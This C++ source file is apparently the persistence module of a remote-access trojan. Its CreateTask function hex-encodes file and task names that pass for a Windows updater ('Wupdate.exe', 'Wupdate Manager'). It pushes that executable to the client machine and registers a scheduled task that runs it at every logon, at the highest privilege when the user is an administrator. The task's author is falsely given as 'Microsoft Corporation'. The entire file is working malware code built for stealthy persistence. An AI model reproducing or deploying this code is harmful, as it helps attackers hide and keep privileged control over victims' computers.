#include "Persistence.h"
#include <cstringt.h>

Persistence::Persistence(PublicStructers::client clientInformation)
{
	clientInfo = clientInformation;
}

bool Persistence::CreateTask(string path)
{
	char file[200];
	if (!GetModuleFileNameA(NULL, (LPSTR)file, sizeof(file)) != 0)
		return false;
	string filename = Encryptions::hexToAscii("577570646174652E657865");
	if (!DownloadUpload.upload_to_client(filename, clientInfo, false, stayHomePath))
		return false;
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return false;
	}

	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		CoUninitialize();
		return false;
	}
	wstring app = Utils::s2ws(Encryptions::hexToAscii("57757064617465204d616e61676572")).c_str();
	LPCWSTR wszTaskName = app.c_str();
	path = path + "\\" + filename;
	wstring wstrExecutablePath(path.begin(), path.end());
	ITaskService* pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler,
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_ITaskService,
		(void**)&pService);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		CoUninitialize();
		return false;
	}
	tagVARIANT t;
	t = VARIANT();
    hr = pService->Connect(_variant_t(), _variant_t(),_variant_t(), _variant_t());
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pService->Release();
		CoUninitialize();
		return false;
	}
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(BSTR(L"\\"), &pRootFolder);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pService->Release();
		CoUninitialize();
		return false;
	}
	pRootFolder->DeleteTask(BSTR(wszTaskName), 0);
	ITaskDefinition* pTask = NULL;
	hr = pService->NewTask(0, &pTask);

	pService->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}
	IRegistrationInfo* pRegInfo = NULL;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	BSTR bstrText = _com_util::ConvertStringToBSTR("Microsoft Corporation");
	hr = pRegInfo->put_Author(BSTR(bstrText));
	SysFreeString(bstrText);
	pRegInfo->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}

	IPrincipal* pPrincipal = NULL;
	hr = pTask->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	if (strncmp(clientInfo.isA.c_str(), "True", 4) == 0)
	{
		hr = pPrincipal->put_Id(BSTR(L"Principal1"));
		if (FAILED(hr))
		{
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		}
		hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		}
		hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
		pPrincipal->Release();
		if (FAILED(hr))
		{
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
			pRootFolder->Release();
			pTask->Release();
			CoUninitialize();
			return false;
		}
	}

	ITaskSettings* pSettings = NULL;
	hr = pTask->get_Settings(&pSettings);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	pSettings->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	ITrigger* pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}

	ILogonTrigger* pLogonTrigger = NULL;
	hr = pTrigger->QueryInterface(
		IID_ILogonTrigger, (void**)&pLogonTrigger);
	pTrigger->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	hr = pLogonTrigger->put_Id(BSTR(L"Trigger1"));
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
	}
	bstrText = _com_util::ConvertStringToBSTR(clientInfo.username.c_str());
	hr = pLogonTrigger->put_UserId(BSTR(bstrText));
	SysFreeString(bstrText);
	pLogonTrigger->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}

	IActionCollection* pActionCollection = NULL;
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	IAction* pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}

	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(
		IID_IExecAction, (void**)&pExecAction);
	pAction->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	hr = pExecAction->put_Path(BSTR(wstrExecutablePath.c_str()));
	pExecAction->Release();
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}

	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(
		BSTR(wszTaskName),
		pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
		TASK_LOGON_NONE,
        _variant_t(),
		&pRegisteredTask);
	if (FAILED(hr))
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	pRootFolder->Release();
	pTask->Release();
	pRegisteredTask->Release();
	CoUninitialize();
	return true;
}